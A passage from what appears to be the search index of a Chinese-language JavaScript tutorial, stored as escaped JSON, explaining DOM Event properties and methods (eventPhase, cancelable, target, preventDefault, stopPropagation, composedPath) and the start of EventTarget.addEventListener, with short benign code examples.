\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u5e38\u91cf\uff0c\u8868\u793a\u4e8b\u4ef6\u76ee\u524d\u6240\u5904\u7684\u9636\u6bb5\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 var phase = event . eventPhase ; Event.eventPhase \u7684\u8fd4\u56de\u503c\u6709\u56db\u79cd\u53ef\u80fd\u3002 0\uff0c\u4e8b\u4ef6\u76ee\u524d\u6ca1\u6709\u53d1\u751f\u3002 1\uff0c\u4e8b\u4ef6\u76ee\u524d\u5904\u4e8e\u6355\u83b7\u9636\u6bb5\uff0c\u5373\u5904\u4e8e\u4ece\u7956\u5148\u8282\u70b9\u5411\u76ee\u6807\u8282\u70b9\u7684\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u3002 2\uff0c\u4e8b\u4ef6\u5230\u8fbe\u76ee\u6807\u8282\u70b9\uff0c\u5373 Event.target \u5c5e\u6027\u6307\u5411\u7684\u90a3\u4e2a\u8282\u70b9\u3002 3\uff0c\u4e8b\u4ef6\u5904\u4e8e\u5192\u6ce1\u9636\u6bb5\uff0c\u5373\u5904\u4e8e\u4ece\u76ee\u6807\u8282\u70b9\u5411\u7956\u5148\u8282\u70b9\u7684\u53cd\u5411\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u3002","title":"Event.bubbles\uff0cEvent.eventPhase"},{"location":"events/event/#eventcancelableeventcancelbubbleeventdefaultprevented","text":"Event.cancelable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u662f\u5426\u53ef\u4ee5\u53d6\u6d88\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u5c5e\u6027\uff0c\u4e00\u822c\u7528\u6765\u4e86\u89e3 Event \u5b9e\u4f8b\u7684\u7279\u6027\u3002 \u5927\u591a\u6570\u6d4f\u89c8\u5668\u7684\u539f\u751f\u4e8b\u4ef6\u662f\u53ef\u4ee5\u53d6\u6d88\u7684\u3002\u6bd4\u5982\uff0c\u53d6\u6d88 click \u4e8b\u4ef6\uff0c\u70b9\u51fb\u94fe\u63a5\u5c06\u65e0\u6548\u3002\u4f46\u662f\u9664\u975e\u663e\u5f0f\u58f0\u660e\uff0c Event \u6784\u9020\u51fd\u6570\u751f\u6210\u7684\u4e8b\u4ef6\uff0c\u9ed8\u8ba4\u662f\u4e0d\u53ef\u4ee5\u53d6\u6d88\u7684\u3002 1 2 var evt = new Event ( 'foo' ); evt . cancelable // false \u5f53 Event.cancelable \u5c5e\u6027\u4e3a true \u65f6\uff0c\u8c03\u7528 Event.preventDefault() \u5c31\u53ef\u4ee5\u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u963b\u6b62\u6d4f\u89c8\u5668\u5bf9\u8be5\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002 \u5982\u679c\u4e8b\u4ef6\u4e0d\u80fd\u53d6\u6d88\uff0c\u8c03\u7528 Event.preventDefault() \u4f1a\u6ca1\u6709\u4efb\u4f55\u6548\u679c\u3002\u6240\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4e4b\u524d\uff0c\u6700\u597d\u7528 Event.cancelable \u5c5e\u6027\u5224\u65ad\u4e00\u4e0b\u662f\u5426\u53ef\u4ee5\u53d6\u6d88\u3002 1 2 3 4 5 6 7 8 function preventEvent ( event ) { if ( event . cancelable ) { event . preventDefault (); } else { console . warn ( 'This event couldn\\'t be canceled.' ); console . dir ( event ); } } Event.cancelBubble \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u76f8\u5f53\u4e8e\u6267\u884c Event.stopPropagation() \uff0c\u53ef\u4ee5\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\u3002 Event.defaultPrevented \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u4e8b\u4ef6\u662f\u5426\u8c03\u7528\u8fc7 Event.preventDefault \u65b9\u6cd5\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 if ( event . defaultPrevented ) { console . log ( '\u8be5\u4e8b\u4ef6\u5df2\u7ecf\u53d6\u6d88\u4e86' ); }","title":"Event.cancelable\uff0cEvent.cancelBubble\uff0cevent.defaultPrevented"},{"location":"events/event/#eventcurrenttargeteventtarget","text":"\u4e8b\u4ef6\u53d1\u751f\u4ee5\u540e\uff0c\u4f1a\u7ecf\u8fc7\u6355\u83b7\u548c\u5192\u6ce1\u4e24\u4e2a\u9636\u6bb5\uff0c\u4f9d\u6b21\u901a\u8fc7\u591a\u4e2a DOM \u8282\u70b9\u3002\u56e0\u6b64\uff0c\u4efb\u610f\u4e8b\u4ef6\u90fd\u6709\u4e24\u4e2a\u4e0e\u4e8b\u4ef6\u76f8\u5173\u7684\u8282\u70b9\uff0c\u4e00\u4e2a\u662f\u4e8b\u4ef6\u7684\u539f\u59cb\u89e6\u53d1\u8282\u70b9\uff08 Event.target \uff09\uff0c\u53e6\u4e00\u4e2a\u662f\u4e8b\u4ef6\u5f53\u524d\u6b63\u5728\u901a\u8fc7\u7684\u8282\u70b9\uff08 Event.currentTarget \uff09\u3002\u524d\u8005\u901a\u5e38\u662f\u540e\u8005\u7684\u540e\u4ee3\u8282\u70b9\u3002 Event.currentTarget \u5c5e\u6027\u8fd4\u56de\u4e8b\u4ef6\u5f53\u524d\u6240\u5728\u7684\u8282\u70b9\uff0c\u5373\u4e8b\u4ef6\u5f53\u524d\u6b63\u5728\u901a\u8fc7\u7684\u8282\u70b9\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u76d1\u542c\u51fd\u6570\u6240\u5728\u7684\u90a3\u4e2a\u8282\u70b9\u3002\u968f\u7740\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\u4f1a\u53d8\u3002 Event.target \u5c5e\u6027\u8fd4\u56de\u539f\u59cb\u89e6\u53d1\u4e8b\u4ef6\u7684\u90a3\u4e2a\u8282\u70b9\uff0c\u5373\u4e8b\u4ef6\u6700\u521d\u53d1\u751f\u7684\u8282\u70b9\u3002\u8fd9\u4e2a\u5c5e\u6027\u4e0d\u4f1a\u968f\u7740\u4e8b\u4ef6\u7684\u4f20\u64ad\u800c\u6539\u53d8\u3002 \u4e8b\u4ef6\u4f20\u64ad\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u8282\u70b9\u7684\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 Event.target \u4e0e Event.currentTarget \u5c5e\u6027\u7684\u503c\u662f\u4e0d\u4e00\u6837\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // HTML \u4ee3\u7801\u4e3a // <p id=\"para\">Hello <em>World</em></p> function hide ( e ) { // \u4e0d\u7ba1\u70b9\u51fb Hello \u6216 World\uff0c\u603b\u662f\u8fd4\u56de true console . log ( this === e . currentTarget ); // \u70b9\u51fb Hello\uff0c\u8fd4\u56de true // \u70b9\u51fb World\uff0c\u8fd4\u56de false console . log ( this === e . target ); } document . getElementById ( 'para' ). addEventListener ( 'click' , hide , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <em> \u662f <p> \u7684\u5b50\u8282\u70b9\uff0c\u70b9\u51fb <em> \u6216\u8005\u70b9\u51fb <p> \uff0c\u90fd\u4f1a\u5bfc\u81f4\u76d1\u542c\u51fd\u6570\u6267\u884c\u3002\u8fd9\u65f6\uff0c e.target \u603b\u662f\u6307\u5411\u539f\u59cb\u70b9\u51fb\u4f4d\u7f6e\u7684\u90a3\u4e2a\u8282\u70b9\uff0c\u800c e.currentTarget \u6307\u5411\u4e8b\u4ef6\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u6b63\u5728\u7ecf\u8fc7\u7684\u90a3\u4e2a\u8282\u70b9\u3002\u7531\u4e8e\u76d1\u542c\u51fd\u6570\u53ea\u6709\u4e8b\u4ef6\u7ecf\u8fc7\u65f6\u624d\u4f1a\u89e6\u53d1\uff0c\u6240\u4ee5 e.currentTarget \u603b\u662f\u7b49\u540c\u4e8e\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \u3002","title":"Event.currentTarget\uff0cEvent.target"},{"location":"events/event/#eventtype","text":"Event.type \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\u3002\u4e8b\u4ef6\u7684\u7c7b\u578b\u662f\u5728\u751f\u6210\u4e8b\u4ef6\u7684\u65f6\u5019\u6307\u5b9a\u7684\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 var evt = new Event ( 'foo' ); evt . type // \"foo\"","title":"Event.type"},{"location":"events/event/#eventtimestamp","text":"Event.timeStamp \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6beb\u79d2\u65f6\u95f4\u6233\uff0c\u8868\u793a\u4e8b\u4ef6\u53d1\u751f\u7684\u65f6\u95f4\u3002\u5b83\u662f\u76f8\u5bf9\u4e8e\u7f51\u9875\u52a0\u8f7d\u6210\u529f\u5f00\u59cb\u8ba1\u7b97\u7684\u3002 1 2 var evt = new Event ( 'foo' ); evt . timeStamp // 3683.6999999995896 \u5b83\u7684\u8fd4\u56de\u503c\u6709\u53ef\u80fd\u662f\u6574\u6570\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5c0f\u6570\uff08\u9ad8\u7cbe\u5ea6\u65f6\u95f4\u6233\uff09\uff0c\u53d6\u51b3\u4e8e\u6d4f\u89c8\u5668\u7684\u8bbe\u7f6e\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u8ba1\u7b97\u9f20\u6807\u79fb\u52a8\u901f\u5ea6\u7684\u4f8b\u5b50\uff0c\u663e\u793a\u6bcf\u79d2\u79fb\u52a8\u7684\u50cf\u7d20\u6570\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 var previousX ; var previousY ; var previousT ; window . addEventListener ( 'mousemove' , function ( event ) { if ( previousX !== undefined && previousY !== undefined && previousT !== undefined ) { var deltaX = event . screenX - previousX ; var deltaY = event . screenY - previousY ; var deltaD = Math . sqrt ( Math . pow ( deltaX , 2 ) + Math . pow ( deltaY , 2 )); var deltaT = event . timeStamp - previousT ; console . log ( deltaD / deltaT * 1000 ); } previousX = event . screenX ; previousY = event . screenY ; previousT = event . timeStamp ; });","title":"Event.timeStamp"},{"location":"events/event/#eventistrusted","text":"Event.isTrusted \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u4e8b\u4ef6\u662f\u5426\u7531\u771f\u5b9e\u7684\u7528\u6237\u884c\u4e3a\u4ea7\u751f\u3002\u6bd4\u5982\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u4f1a\u4ea7\u751f\u4e00\u4e2a click \u4e8b\u4ef6\uff0c\u8be5\u4e8b\u4ef6\u662f\u7528\u6237\u4ea7\u751f\u7684\uff1b Event \u6784\u9020\u51fd\u6570\u751f\u6210\u7684\u4e8b\u4ef6\uff0c\u5219\u662f\u811a\u672c\u4ea7\u751f\u7684\u3002 1 2 var evt = new Event ( 'foo' ); evt . isTrusted // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c evt \u5bf9\u8c61\u662f\u811a\u672c\u4ea7\u751f\u7684\uff0c\u6240\u4ee5 isTrusted \u5c5e\u6027\u8fd4\u56de false \u3002","title":"Event.isTrusted"},{"location":"events/event/#eventdetail","text":"Event.detail \u5c5e\u6027\u53ea\u6709\u6d4f\u89c8\u5668\u7684 UI \uff08\u7528\u6237\u754c\u9762\uff09\u4e8b\u4ef6\u624d\u5177\u6709\u3002\u8be5\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u67d0\u79cd\u4fe1\u606f\u3002\u5177\u4f53\u542b\u4e49\u4e0e\u4e8b\u4ef6\u7c7b\u578b\u76f8\u5173\u3002\u6bd4\u5982\uff0c\u5bf9\u4e8e click \u548c dblclick \u4e8b\u4ef6\uff0c Event.detail \u662f\u9f20\u6807\u6309\u4e0b\u7684\u6b21\u6570\uff08 1 \u8868\u793a\u5355\u51fb\uff0c 2 \u8868\u793a\u53cc\u51fb\uff0c 3 \u8868\u793a\u4e09\u51fb\uff09\uff1b\u5bf9\u4e8e\u9f20\u6807\u6eda\u8f6e\u4e8b\u4ef6\uff0c Event.detail \u662f\u6eda\u8f6e\u6b63\u5411\u6eda\u52a8\u7684\u8ddd\u79bb\uff0c\u8d1f\u503c\u5c31\u662f\u8d1f\u5411\u6eda\u52a8\u7684\u8ddd\u79bb\uff0c\u8fd4\u56de\u503c\u603b\u662f3\u7684\u500d\u6570\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <p>Hello</p> function giveDetails ( e ) { console . log ( e . detail ); } document . querySelector ( 'p' ). onclick = giveDetails ;","title":"Event.detail"},{"location":"events/event/#_3","text":"","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"events/event/#eventpreventdefault","text":"Event.preventDefault \u65b9\u6cd5\u53d6\u6d88\u6d4f\u89c8\u5668\u5bf9\u5f53\u524d\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002\u6bd4\u5982\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u4f1a\u8df3\u8f6c\u5230\u53e6\u4e00\u4e2a\u9875\u9762\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u4e0d\u4f1a\u8df3\u8f6c\u4e86\uff1b\u518d\u6bd4\u5982\uff0c\u6309\u4e00\u4e0b\u7a7a\u683c\u952e\uff0c\u9875\u9762\u5411\u4e0b\u6eda\u52a8\u4e00\u6bb5\u8ddd\u79bb\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4ee5\u540e\u4e5f\u4e0d\u4f1a\u6eda\u52a8\u4e86\u3002\u8be5\u65b9\u6cd5\u751f\u6548\u7684\u524d\u63d0\u662f\uff0c\u4e8b\u4ef6\u5bf9\u8c61\u7684 cancelable \u5c5e\u6027\u4e3a true \uff0c\u5982\u679c\u4e3a false \uff0c\u8c03\u7528\u8be5\u65b9\u6cd5\u6ca1\u6709\u4efb\u4f55\u6548\u679c\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u53ea\u662f\u53d6\u6d88\u4e8b\u4ef6\u5bf9\u5f53\u524d\u5143\u7d20\u7684\u9ed8\u8ba4\u5f71\u54cd\uff0c\u4e0d\u4f1a\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\u3002\u5982\u679c\u8981\u963b\u6b62\u4f20\u64ad\uff0c\u53ef\u4ee5\u4f7f\u7528 stopPropagation() \u6216 stopImmediatePropagation() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // HTML \u4ee3\u7801\u4e3a // <input type=\"checkbox\" id=\"my-checkbox\" /> var cb = document . getElementById ( 'my-checkbox' ); cb . addEventListener ( 'click' , function ( e ){ e . preventDefault (); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u5355\u51fb\u4f1a\u9009\u4e2d\u5355\u9009\u6846\uff0c\u53d6\u6d88\u8fd9\u4e2a\u884c\u4e3a\uff0c\u5c31\u5bfc\u81f4\u65e0\u6cd5\u9009\u4e2d\u5355\u9009\u6846\u3002 \u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4e3a\u6587\u672c\u8f93\u5165\u6846\u8bbe\u7f6e\u6821\u9a8c\u6761\u4ef6\u3002\u5982\u679c\u7528\u6237\u7684\u8f93\u5165\u4e0d\u7b26\u5408\u6761\u4ef6\uff0c\u5c31\u65e0\u6cd5\u5c06\u5b57\u7b26\u8f93\u5165\u6587\u672c\u6846\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u4e3a // <input type=\"text\" id=\"my-input\" /> var input = document . getElementById ( 'my-input' ); input . addEventListener ( 'keypress' , checkName , false ); function checkName ( e ) { if ( e . charCode < 97 || e . charCode > 122 ) { e . preventDefault (); } } \u4e0a\u9762\u4ee3\u7801\u4e3a\u6587\u672c\u6846\u7684 keypress \u4e8b\u4ef6\u8bbe\u5b9a\u76d1\u542c\u51fd\u6570\u540e\uff0c\u5c06\u53ea\u80fd\u8f93\u5165\u5c0f\u5199\u5b57\u6bcd\uff0c\u5426\u5219\u8f93\u5165\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\uff08\u5199\u5165\u6587\u672c\u6846\uff09\u5c06\u88ab\u53d6\u6d88\uff0c\u5bfc\u81f4\u4e0d\u80fd\u5411\u6587\u672c\u6846\u8f93\u5165\u5185\u5bb9\u3002","title":"Event.preventDefault()"},{"location":"events/event/#eventstoppropagation","text":"stopPropagation \u65b9\u6cd5\u963b\u6b62\u4e8b\u4ef6\u5728 DOM \u4e2d\u7ee7\u7eed\u4f20\u64ad\uff0c\u9632\u6b62\u518d\u89e6\u53d1\u5b9a\u4e49\u5728\u522b\u7684\u8282\u70b9\u4e0a\u7684\u76d1\u542c\u51fd\u6570\uff0c\u4f46\u662f\u4e0d\u5305\u62ec\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u5176\u4ed6\u7684\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 function stopEvent ( e ) { e . stopPropagation (); } el . addEventListener ( 'click' , stopEvent , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u5c06\u4e0d\u4f1a\u8fdb\u4e00\u6b65\u5192\u6ce1\u5230 el \u8282\u70b9\u7684\u7236\u8282\u70b9\u3002","title":"Event.stopPropagation()"},{"location":"events/event/#eventstopimmediatepropagation","text":"Event.stopImmediatePropagation \u65b9\u6cd5\u963b\u6b62\u540c\u4e00\u4e2a\u4e8b\u4ef6\u7684\u5176\u4ed6\u76d1\u542c\u51fd\u6570\u88ab\u8c03\u7528\uff0c\u4e0d\u7ba1\u76d1\u542c\u51fd\u6570\u5b9a\u4e49\u5728\u5f53\u524d\u8282\u70b9\u8fd8\u662f\u5176\u4ed6\u8282\u70b9\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8be5\u65b9\u6cd5\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u6bd4 Event.stopPropagation() \u66f4\u5f7b\u5e95\u3002 \u5982\u679c\u540c\u4e00\u4e2a\u8282\u70b9\u5bf9\u4e8e\u540c\u4e00\u4e2a\u4e8b\u4ef6\u6307\u5b9a\u4e86\u591a\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u4f1a\u6839\u636e\u6dfb\u52a0\u7684\u987a\u5e8f\u4f9d\u6b21\u8c03\u7528\u3002\u53ea\u8981\u5176\u4e2d\u6709\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\u8c03\u7528\u4e86 Event.stopImmediatePropagation \u65b9\u6cd5\uff0c\u5176\u4ed6\u7684\u76d1\u542c\u51fd\u6570\u5c31\u4e0d\u4f1a\u518d\u6267\u884c\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 function l1 ( e ){ e . stopImmediatePropagation (); } function l2 ( e ){ console . log ( 'hello world' ); } el . addEventListener ( 'click' , l1 , false ); el . addEventListener ( 'click' , l2 , false ); \u4e0a\u9762\u4ee3\u7801\u5728 el \u8282\u70b9\u4e0a\uff0c\u4e3a click \u4e8b\u4ef6\u6dfb\u52a0\u4e86\u4e24\u4e2a\u76d1\u542c\u51fd\u6570 l1 \u548c l2 \u3002\u7531\u4e8e l1 \u8c03\u7528\u4e86 event.stopImmediatePropagation \u65b9\u6cd5\uff0c\u6240\u4ee5 l2 \u4e0d\u4f1a\u88ab\u8c03\u7528\u3002","title":"Event.stopImmediatePropagation()"},{"location":"events/event/#eventcomposedpath","text":"Event.composedPath() \u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u4e8b\u4ef6\u7684\u6700\u5e95\u5c42\u8282\u70b9\u548c\u4f9d\u6b21\u5192\u6ce1\u7ecf\u8fc7\u7684\u6240\u6709\u4e0a\u5c42\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 // HTML \u4ee3\u7801\u5982\u4e0b // <div> // <p>Hello</p> // </div> var div = document . querySelector ( 'div' ); var p = document . querySelector ( 'p' ); div . addEventListener ( 'click' , function ( e ) { console . log ( e . composedPath ()); }, false ); // [p, div, body, html, document, Window] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u7684\u6700\u5e95\u5c42\u8282\u70b9\u662f p \uff0c\u5411\u4e0a\u4f9d\u6b21\u662f div \u3001 body \u3001 html \u3001 document \u3001 Window \u3002","title":"Event.composedPath()"},{"location":"events/eventtarget/","text":"EventTarget \u63a5\u53e3 \u00b6 \u4e8b\u4ef6\u7684\u672c\u8d28\u662f\u7a0b\u5e8f\u5404\u4e2a\u7ec4\u6210\u90e8\u5206\u4e4b\u95f4\u7684\u4e00\u79cd\u901a\u4fe1\u65b9\u5f0f\uff0c\u4e5f\u662f\u5f02\u6b65\u7f16\u7a0b\u7684\u4e00\u79cd\u5b9e\u73b0\u3002DOM \u652f\u6301\u5927\u91cf\u7684\u4e8b\u4ef6\uff0c\u672c\u7ae0\u5f00\u59cb\u4ecb\u7ecd DOM \u7684\u4e8b\u4ef6\u7f16\u7a0b\u3002 \u4ecb\u7ecd\u5177\u4f53\u7684\u4e8b\u4ef6\u4e4b\u524d\uff0c\u5148\u6765\u770b\u770b\u5982\u4f55\u8ba9 DOM \u8282\u70b9\u76d1\u542c\u4e8b\u4ef6\u3002 \u6982\u8ff0 \u00b6 DOM \u8282\u70b9\u7684\u4e8b\u4ef6\u64cd\u4f5c\uff08\u76d1\u542c\u548c\u89e6\u53d1\uff09\uff0c\u90fd\u5b9a\u4e49\u5728 EventTarget \u63a5\u53e3\u3002\u6240\u6709\u8282\u70b9\u5bf9\u8c61\u90fd\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5176\u4ed6\u4e00\u4e9b\u9700\u8981\u4e8b\u4ef6\u901a\u4fe1\u7684\u6d4f\u89c8\u5668\u5185\u7f6e\u5bf9\u8c61\uff08\u6bd4\u5982\uff0c XMLHttpRequest \u3001 AudioNode \u3001 AudioContext \uff09\u4e5f\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\u3002 \u8be5\u63a5\u53e3\u4e3b\u8981\u63d0\u4f9b\u4e09\u4e2a\u5b9e\u4f8b\u65b9\u6cd5\u3002 addEventListener() \uff1a\u7ed1\u5b9a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570 removeEventListener() \uff1a\u79fb\u9664\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570 dispatchEvent() \uff1a\u89e6\u53d1\u4e8b\u4ef6 EventTarget.addEventListener() \u00b6 EventTarget.addEventListener() \u7528\u4e8e\u5728\u5f53\u524d\u8282\u70b9\u6216\u5bf9\u8c61\u4e0a\uff08\u5373\u90e8\u7f72\u4e86 EventTarget \u63a5\u53e3\u7684\u5bf9\u8c61\uff09\uff0c\u5b9a\u4e49\u4e00\u4e2a\u7279\u5b9a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u4e00\u65e6\u8fd9\u4e2a\u4e8b\u4ef6\u53d1\u751f\uff0c\u5c31\u4f1a\u6267\u884c\u76d1\u542c\u51fd\u6570\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 target . addEventListener ( type , listener [, useCapture ]); \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 type \uff1a\u4e8b\u4ef6\u540d\u79f0\uff0c\u5927\u5c0f\u5199\u654f\u611f\u3002 listener \uff1a\u76d1\u542c\u51fd\u6570\u3002\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u4f1a\u8c03\u7528\u8be5\u76d1\u542c\u51fd\u6570\u3002 useCapture \uff1a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u8868\u793a\u76d1\u542c\u51fd\u6570\u5c06\u5728\u6355\u83b7\u9636\u6bb5\uff08capture\uff09\u89e6\u53d1\uff08\u53c2\u89c1\u540e\u6587\u300a\u4e8b\u4ef6\u7684\u4f20\u64ad\u300b\u90e8\u5206\uff09\u3002\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u9ed8\u8ba4\u503c\u4e3a false \uff08\u76d1\u542c\u51fd\u6570\u53ea\u5728\u5192\u6ce1\u9636\u6bb5\u88ab\u89e6\u53d1\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 function hello () { console . log ( 'Hello world' ); } var button = document . getElementById ( 'btn' ); button . addEventListener ( 'click' , hello , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c button \u8282\u70b9\u7684 addEventListener() \u65b9\u6cd5\u7ed1\u5b9a click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570 hello() \uff0c\u8be5\u51fd\u6570\u53ea\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 \u5173\u4e8e\u53c2\u6570\uff0c\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002 \u9996\u5148\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u9664\u4e86\u76d1\u542c\u51fd\u6570\uff0c\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u5177\u6709 handleEvent \u65b9\u6cd5\u7684\u5bf9\u8c61\uff0c\u6548\u679c\u4e0e\u76d1\u542c\u51fd\u6570\u4e00\u6837\u3002 1 2 3 4 5 buttonElement . addEventListener ( 'click' , { handleEvent : function ( event ) { console . log ( 'click' ); } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c addEventListener() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u4e00\u4e2a\u5177\u6709 handleEvent() \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002 \u5176\u6b21\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u9664\u4e86\u5e03\u5c14\u503c useCapture \uff0c\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u76d1\u542c\u5668\u914d\u7f6e\u5bf9\u8c61\uff0c\u5b9a\u5236\u4e8b\u4ef6\u76d1\u542c\u884c\u4e3a\u3002\u8be5\u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 capture \uff1a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u8868\u793a\u76d1\u542c\u51fd\u6570\u5728\u6355\u83b7\u9636\u6bb5\u89e6\u53d1\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 once \uff1a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u8868\u793a\u76d1\u542c\u51fd\u6570\u6267\u884c\u4e00\u6b21\u5c31\u4f1a\u81ea\u52a8\u79fb\u9664\uff0c\u540e\u9762\u5c06\u4e0d\u518d\u76d1\u542c\u8be5\u4e8b\u4ef6\u3002\u8be5\u5c5e\u6027\u9ed8\u8ba4\u503c\u4e3a false \u3002 passive \uff1a\u5e03\u5c14\u503c\uff0c\u8bbe\u4e3a true \u65f6\uff0c\u8868\u793a\u7981\u6b62\u76d1\u542c\u51fd\u6570\u8c03\u7528 preventDefault() \u65b9\u6cd5\u3002\u5982\u679c\u8c03\u7528\u4e86\uff0c\u6d4f\u89c8\u5668\u5c06\u5ffd\u7565\u8fd9\u4e2a\u8981\u6c42\uff0c\u5e76\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u4e00\u6761\u8b66\u544a\u3002\u8be5\u5c5e\u6027\u9ed8\u8ba4\u503c\u4e3a false \u3002 signal \uff1a\u8be5\u5c5e\u6027\u7684\u503c\u4e3a\u4e00\u4e2a AbortSignal \u5bf9\u8c61\uff0c\u4e3a\u76d1\u542c\u5668\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u4fe1\u53f7\u901a\u9053\uff0c\u7528\u6765\u5728\u9700\u8981\u65f6\u53d1\u51fa\u4fe1\u53f7\uff0c\u79fb\u9664\u76d1\u542c\u51fd\u6570\u3002 \u4e0b\u9762\u662f once \u5c5e\u6027\u7684\u4f8b\u5b50\uff0c\u8ba9\u76d1\u542c\u51fd\u6570\u53ea\u6267\u884c\u4e00\u6b21\u3002 1 2 3 element . addEventListener ( 'click' , function ( event ) { // \u53ea\u6267\u884c\u4e00\u6b21\u7684\u4ee3\u7801 }, { once : true }); addEventListener() 